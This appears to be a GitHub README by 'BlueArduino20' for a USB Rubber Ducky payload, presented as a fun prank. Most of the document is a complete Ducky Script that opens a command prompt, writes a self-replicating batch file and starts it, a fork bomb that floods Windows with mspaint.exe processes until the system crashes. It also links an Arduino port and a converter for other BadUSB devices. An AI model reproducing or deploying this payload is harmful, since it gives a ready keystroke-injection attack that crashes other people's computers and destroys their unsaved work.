# About...
Version: 1.0

Author: BlueArduino20

# Fork Bomb for Rubber Ducky (For Windows)
Really basic script to crash Windows executing exponencially "mspaint.exe" and the same bat. It could be fun!

It's designed for the USB Rubber Ducky, but you can convert it for other BadUSB working with arduino with Duckuino.js (By d4n5h): https://github.com/d4n5h/Duckuino

Anyway, here you've got the code:

# Code for Rubber Ducky

<pre><code>REM Fork Bomb for Windows. By: BlueArduino20
REM Let's give windows time to recognize our BadUSB
DELAY 2000
GUI r
ENTER
DELAY 100
STRING cmd
ENTER
DELAY 100
STRING copy con F.bat
ENTER
STRING :A
ENTER
STRING start mspaint.exe && start F.bat
ENTER
STRING GOTO A
ENTER
CONTROL z
ENTER
DELAY 100
STRING start F.bat</pre></code>

# Arduino code

<a href="https://github.com/BlueArduino20/Fork-bomb-for-Rubber-Ducky/blob/master/fork-bomb-arduino-script.ino">Fork-bomb-arduino-script.ino</a>
